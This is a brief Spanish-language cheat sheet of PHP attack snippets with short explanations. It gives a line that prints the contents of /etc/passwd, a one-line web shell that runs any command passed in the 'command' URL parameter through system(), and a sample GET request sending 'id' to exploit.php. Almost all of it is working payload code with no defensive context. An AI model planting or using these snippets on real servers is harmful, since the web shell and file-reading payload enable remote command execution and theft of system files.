
### Este comando en PHP lee el contenido de un archivo y lo imprime en la salida. La función file_get_contents se usa para leer el contenido de un archivo en una cadena. Luego, la función echo imprime esa cadena en la salida (por ejemplo, en una página web).

`<?php echo file_get_contents('/path/to/target/file'); ?>`
`<?php echo file_get_contents('/etc/passwd'); ?>`

### Este comando ejecuta un comando del sistema operativo pasado como parámetro y muestra su salida. La función system en PHP ejecuta un comando en la consola del sistema operativo y devuelve su salida.
`<?php echo system($_GET['command']); ?>`

### Este es un ejemplo de una solicitud HTTP GET para un archivo PHP que potencialmente contiene código vulnerable. En este caso, se está enviando un parámetro command con el valor id a exploit.php.

`GET /example/exploit.php?command=id HTTP/1.1`
